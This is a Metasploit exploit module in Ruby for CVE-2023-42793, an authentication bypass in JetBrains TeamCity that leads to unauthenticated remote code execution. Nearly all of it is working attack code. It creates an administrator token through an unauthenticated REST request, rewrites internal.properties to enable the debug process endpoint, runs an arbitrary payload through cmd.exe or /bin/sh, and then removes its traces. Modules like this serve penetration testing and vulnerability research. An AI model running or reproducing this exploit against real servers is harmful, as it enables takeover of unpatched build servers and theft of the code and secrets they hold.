##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Retry
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'JetBrains TeamCity Unauthenticated Remote Code Execution',
        'Description' => %q{
          This module exploits an authentication bypass vulnerability to achieve unauthenticated remote code execution
          against a vulnerable JetBrains TeamCity server. All versions of TeamCity prior to version 2023.05.4 are
          vulnerable to this issue. The vulnerability was originally discovered by SonarSource.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'sfewer-r7', # MSF Exploit & Rapid7 Analysis
        ],
        'References' => [
          ['CVE', '2023-42793'],
          ['URL', 'https://attackerkb.com/topics/1XEEEkGHzt/cve-2023-42793/rapid7-analysis'],
          ['URL', 'https://blog.jetbrains.com/teamcity/2023/09/critical-security-issue-affecting-teamcity-on-premises-update-to-2023-05-4-now/']
        ],
        'DisclosureDate' => '2023-09-19',
        'Platform' => %w[win linux],
        'Arch' => [ARCH_CMD],
        'Payload' => { 'Space' => 1024 },
        'Privileged' => false, # TeamCity may be installed to run as local system/root, or it may be run as a custom user account.
        'Targets' => [
          [
            'Windows',
            {
              'Platform' => 'win'
            }
          ],
          [
            'Linux',
            {
              'Platform' => 'linux'
            }
          ]
        ],
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )
 
    register_options(
      [
        # By default TeamCity listens for HTTP requests on TCP port 8111.
        Opt::RPORT(8111),
        # The first user created during installation is an administrator account, so the ID will be 1.
        OptInt.new('TEAMCITY_ADMIN_ID', [true, 'The ID of an administrator account to authenticate as', 1]),
        # We modify a configuration file, we need to wait for the changes to be picked up. These options govern how we wait.
        OptInt.new('TEAMCITY_CHANGE_TIMEOUT', [true, 'The timeout to wait for the changes to be applied', 30])
      ]
    )
  end
 
  def check
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => '/login.html'
    )
 
    return CheckCode::Unknown('Connection failed') unless res
 
    # We expect a TeamCity server to respond with either a "TeamCity-Node-Id" header value or a cookie named "TCSESSIONID".
    # In the responses HTML body will be a string containing the release name and build version.
    if (res.headers.key?('TeamCity-Node-Id') || res.get_cookies.include?('TCSESSIONID')) && (res.body =~ /(\d+\.\d+\.\d+) \(build (\d+)\)/)
      detected = "JetBrains TeamCity #{::Regexp.last_match(1)} (build #{::Regexp.last_match(2)}) detected."
 
      # The vulnerability was patched in release 2023.05.4 (build 129421) so anything before this build is vulnerable.
      if ::Regexp.last_match(2).to_i < 129421
        return CheckCode::Vulnerable(detected)
      end
 
      return CheckCode::Safe(detected)
    end
 
    CheckCode::Unknown
  end
 
  def exploit
    token_uri = "/app/rest/users/id:#{datastore['TEAMCITY_ADMIN_ID']}/tokens/RPC2"
 
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(token_uri)
    )
 
    # A token named 'RPC2' may already exist if this system has been exploited before and previous exploitation
    # did not delete teh token after use. We detect that here, delete the token (as we dont know its value) if required
    # and then proceed to create a new token for our use.
    if res && (res.code == 400) && res.body.include?('Token already exists')
 
      print_status('Token already exists, deleting and generating a new one.')
 
      unless delete_token(token_uri)
        fail_with(Failure::UnexpectedReply, 'Failed to delete the authentication token.')
      end
 
      res = send_request_cgi(
        'method' => 'POST',
        'uri' => normalize_uri(token_uri)
      )
    end
 
    unless res&.code == 200
      # One reason token creation may fail is if we use a user ID for a user that does not exist. We detect that here
      # and instruct the user to choose a new ID via the TEAMCITY_ADMIN_ID option.
      if res && (res.code == 404) && res.body.include?('User not found')
        print_warning('User not found, try setting the TEAMCITY_ADMIN_ID option to a different ID.')
      end
 
      fail_with(Failure::UnexpectedReply, 'Failed to create an authentication token.')
    end
 
    begin
      token = Nokogiri::XML(res.body).xpath('/token')&.attr('value').to_s
 
      print_status("Created authentication token: #{token}")
 
      print_status('Modifying internal.properties to allow process creation...')
 
      unless modify_internal_properties(token, 'rest.debug.processes.enable', 'true')
        fail_with(Failure::UnexpectedReply, 'Failed to modify the internal.properties config file.')
      end
 
      begin
        print_status('Executing payload...')
 
        vars_get = {}
 
        # We need to supply multiple params with the same name, so the TeamCity server (A Java Spring framework) can
        # construct a List<String> sequence for multiple parameters. We can do this be enabling `compare_by_identity`
        # in the Ruby Hash.
        vars_get.compare_by_identity
 
        case target['Platform']
        when 'win'
          vars_get['exePath'] = 'cmd.exe'
          vars_get['params'] = '/c'
          vars_get['params'] = payload.encoded
        when 'linux'
          vars_get['exePath'] = '/bin/sh'
          vars_get['params'] = '-c'
          vars_get['params'] = payload.encoded
        end
 
        res = send_request_cgi(
          'method' => 'POST',
          'uri' => normalize_uri('/app/rest/debug/processes'),
          'uri_encode_mode' => 'hex-all', # we must encode all characters in the query param for the payload to work.
          'headers' => {
            'Authorization' => "Bearer #{token}",
            'Content-Type' => 'text/plain'
          },
          'vars_get' => vars_get
        )
 
        unless res&.code == 200
          fail_with(Failure::UnexpectedReply, 'Failed to execute arbitrary process.')
        end
      ensure
        print_status('Resetting the internal.properties settings...')
 
        unless modify_internal_properties(token, 'rest.debug.processes.enable', nil)
          fail_with(Failure::UnexpectedReply, 'Failed to modify the internal.properties config file.')
        end
      end
    ensure
      print_status('Deleting the authentication token.')
 
      unless delete_token(token_uri)
        fail_with(Failure::UnexpectedReply, 'Failed to delete the authentication token.')
      end
    end
  end
 
  def delete_token(token_uri)
    res = send_request_cgi(
      'method' => 'DELETE',
      'uri' => normalize_uri(token_uri),
      'headers' => {
        'Connection' => 'close'
      }
    )
 
    res&.code == 204
  end
 
  def modify_internal_properties(token, key, value)
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri('/admin/dataDir.html'),
      'headers' => {
        'Authorization' => "Bearer #{token}"
      },
      'vars_get' => {
        'action' => 'edit',
        'fileName' => 'config/internal.properties',
        'content' => value ? "#{key}=#{value}" : ''
      }
    )
 
    unless res&.code == 200
      # If we are using an authentication for a non admin user, we cannot modify the internal.properties file. The
      # server will return a 302 redirect if this is the case. Choose a different TEAMCITY_ADMIN_ID and try again.
      if res&.code == 302
        print_warning('This user is not an administrator, try setting the TEAMCITY_ADMIN_ID option to a different ID.')
      end
 
      return false
    end
 
    print_status('Waiting for configuration change to be applied...')
    retry_until_truthy(timeout: datastore['TEAMCITY_CHANGE_TIMEOUT']) do
      res = send_request_cgi(
        'method' => 'GET',
        'uri' => normalize_uri('/admin/admin.html'),
        'headers' => {
          'Authorization' => "Bearer #{token}",
          'Accept' => '*/*'
        },
        'vars_get' => {
          'item' => 'diagnostics',
          'tab' => 'properties'
        }
      )
 
      res&.code == 200 && res.body.include?(key)
    end
  end
end
 